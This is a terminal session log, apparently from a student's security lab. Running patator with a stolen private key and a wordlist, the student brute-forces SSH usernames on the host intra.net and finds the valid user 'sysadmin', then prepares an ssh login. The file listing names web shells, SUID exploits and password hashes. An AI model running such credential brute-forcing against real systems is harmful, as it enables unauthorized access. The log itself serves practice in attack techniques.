@@ -1,0 +1,102 @@
+Script started on 2025-03-30 14:02:23-03:00 [TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="237" LINES="60"]
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [7mpatator ssh_login host=intra.net user=FILE0 keyfile=usuario_privilegiado 0=wordlist_privilegiado.txt -x ignore:mesg='Authentication failed.'[27m
+[A[C[C[C[Cpatator ssh_login host=intra.net user=FILE0 keyfile=usuario_privilegiado 0=wordlist_privilegiado.txt -x ignore:mesg='Authentication failed.'
+[A
+[?2004l/usr/bin/patator:2658: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+14:02:56 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.11.9 at 2025-03-30 14:02 -03
+14:02:56 patator    INFO -                                                                              
+14:02:56 patator    INFO - code  size    time | candidate                          |   num | mesg
+14:02:56 patator    INFO - -----------------------------------------------------------------------------
+^[[B^[[B^[[B^[[B^[[B^[[B14:08:13 patator    FAIL - xxx   79     1.136 | rooster8                           |  1471 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:08:16 patator    FAIL - xxx   79     1.125 | root138                            |  1486 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:08:29 patator    FAIL - xxx   79     1.192 | rootsie                            |  1519 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+^Cs 14:08:32 patator    INFO - Hits/Done/Skip/Fail/Size: 0/1520/0/3/1732, Avg: 4 r/s, Time: 0h 5m 36s
+14:08:32 patator    INFO - To resume execution, pass --resume 152,152,151,152,152,152,151,152,153,153
+
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clear
+[?2004l[H[2J[3J
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m script 
+2025-03-01-ZAP-Report_2.pdf     binario.c                       .face.icon                      intra.net_geracao_de_wordlist   .pcsc10/                        suid                            wordlist_privilegiado.txt
+2025-03-01-ZAP-Report-.pdf      .cache/                         .gnupg/                         .java/                          Pictures/                       suid.c                          .Xauthority
+2025-03-23 13:05:46.627935.xml  cmd.php                         hashes_usuarios                 .john/                          privilegiado.txt                suid.sh                         .Xmodmap
+.bash_history                   common.exe                      hash_sql                        .local/                         .profile                        svcadduser.exe                  .xorgxrdp.10.log
+.bash_logout                    .config/                        .ICEauthority                   marvel.txt                      Public/                         Templates/                      .xorgxrdp.10.log.old
+.bashrc                         Desktop/                        index.html                      .mozilla/                       setoolkit/                      thinclient_drives/              .xsession-errors
+.bashrc.original                Documents/                      info.php                        .msf4/                          shell.php                       usuario_privilegiado            .ZAP/
+beefexploring.html              Downloads/                      intra.net__ftp                  Music/                          .ssh/                           Videos/                         zap_root_ca.cer
+binario                         .face                           intra.net_ftp_patator           output.txt                      .sudo_as_admin_successful       .viminfo                        .zshrc
+]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m script 
+2025-03-01-ZAP-Report_2.pdf     binario.c                       .face.icon                      intra.net_geracao_de_wordlist   .pcsc10/                        suid                            wordlist_privilegiado.txt
+2025-03-01-ZAP-Report-.pdf      .cache/                         .gnupg/                         .java/                          Pictures/                       suid.c                          .Xauthority
+2025-03-23 13:05:46.627935.xml  cmd.php                         hashes_usuarios                 .john/                          privilegiado.txt                suid.sh                         .Xmodmap
+.bash_history                   common.exe                      hash_sql                        .local/                         .profile                        svcadduser.exe                  .xorgxrdp.10.log
+.bash_logout                    .config/                        .ICEauthority                   marvel.txt                      Public/                         Templates/                      .xorgxrdp.10.log.old
+.bashrc                         Desktop/                        index.html                      .mozilla/                       setoolkit/                      thinclient_drives/              .xsession-errors
+.bashrc.original                Documents/                      info.php                        .msf4/                          shell.php                       usuario_privilegiado            .ZAP/
+beefexploring.html              Downloads/                      intra.net__ftp                  Music/                          .ssh/                           Videos/                         zap_root_ca.cer
+binario                         .face                           intra.net_ftp_patator           output.txt                      .sudo_as_admin_successful       .viminfo                        .zshrc
+]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m script [K[K[K[K[K[K[Kclear
+[?2004l[H[2J[3J
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clearpatator ssh_login host=intra.net user=FILE0 keyfile=usuario_privilegiado 0=wordlist_privilegiado.txt -x ignore:mesg='Authentication failed.'[C[C[C[Cupdog[Kcd senhas/[C[C[C[C[5Pupdogpatator ssh_login host=intra.net user=FILE0 keyfile=usuario_privilegiado 0=wordlist_privilegiado.txt -x ignore:mesg='Authentication failed.'[C[C[C[Cclear[K[K[7mhttp://intra.net/~usuario[27m[C[C[C[Chttp://intra.net/~usuario
+[?2004lbash: http://intra.net/~usuario: Arquivo ou diretório inexistente
+
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clear
+[?2004l[H[2J[3J
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clearhttp://intra.net/~usuario[C[C[C[Cclear[Kpatator ssh_login host=intra.net user=FILE0 keyfile=usuario_privilegiado 0=wordlist_privilegiado.txt -x ignore:mesg='Authentication failed.'
+[?2004l/usr/bin/patator:2658: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+14:12:39 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.11.9 at 2025-03-30 14:12 -03
+14:12:39 patator    INFO -                                                                              
+14:12:39 patator    INFO - code  size    time | candidate                          |   num | mesg
+14:12:39 patator    INFO - -----------------------------------------------------------------------------
+14:12:50 patator    FAIL - xxx   79     1.186 | adman1932                          |    29 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:13:13 patator    FAIL - xxx   79     1.151 | administration                     |    89 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:14:32 patator    FAIL - xxx   79     1.240 | aroot                              |   201 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:14:37 patator    FAIL - xxx   79     1.192 | badma0                             |   220 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:16:16 patator    FAIL - xxx   79     1.184 | brookelyn                          |   371 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:16:18 patator    FAIL - xxx   79     1.273 | brookin                            |   381 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:17:11 patator    FAIL - xxx   79     1.237 | broot                              |   456 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:17:13 patator    FAIL - xxx   79     1.192 | brooze                             |   458 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:19:31 patator    FAIL - xxx   79     1.136 | farook                             |   693 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:20:22 patator    FAIL - xxx   79     1.152 | huggyroots                         |   831 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:20:32 patator    FAIL - xxx   79     1.115 | igroove                            |   837 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:21:09 patator    FAIL - xxx   79     1.154 | lynbrook                           |   936 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:21:24 patator    FAIL - xxx   79     1.167 | MADMAN                             |   963 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:22:11 patator    FAIL - xxx   79     1.176 | madmojo                            |  1086 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:22:38 patator    FAIL - xxx   79     1.138 | moroo                              |  1150 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:24:45 patator    FAIL - xxx   79     1.148 | roosegoo                           |  1434 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:25:00 patator    FAIL - xxx   79     1.103 | root138                            |  1486 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:25:55 patator    INFO - 0     38     0.104 | sysadmin                           |  1621 | SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u5
+14:26:03 patator    FAIL - xxx   79     1.138 | theadm                             |  1640 | <class 'paramiko.ssh_exception.SSHException'> Error reading SSH protocol banner
+14:26:53 patator    INFO - Hits/Done/Skip/Fail/Size: 1/1732/0/18/1732, Avg: 2 r/s, Time: 0h 14m 13s
+
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clear
+[?2004l[H[2J[3J
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m script login__ssh_intra.,[Knet__[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kintra.net_ssh
+[?2004lScript started, output log file is 'login__intra.net_ssh'.
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m chmod 6000 u[K[K[K usuario_privilegiado 
+[?2004l
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [7mssh intra.net -i usuario_privilegiado -l <COLOQUE AQUI O USUARIO ENCONTRADO>[27m
+[A[C[C[C[Cssh intra.net -i usuario_privilegiado -l <COLOQUE AQUI O USUARIO ENCONTRADO>
+[A
+[?2004lbash: erro de sintaxe próximo ao token inesperado `newline'
+
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clear
+[?2004l[H[2J[3J
+[?2004h]0;aluno@atacante: ~[;32m┌──([1;34maluno㉿atacante[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m clearssh intra.net -i usuario_privilegiado -l <COLOQUE AQUI O USUARIO ENCONTRADO>[C[C[C[C[45Pchmod 600 usuario_privilegiado [C[C[C[Cupdog[Kcd senhas/[C[C[C[C[5Pupdogchmod 600 usuario_privilegiado [C[C[C[Cssh intra.net -i usuario_privilegiado -l <COLOQUE AQUI O USUARIO ENCONTRADO>[C[C[C[Cclear[K[K
+Script done on 2025-03-30 14:35:47-03:00 [COMMAND_EXIT_CODE="0"]
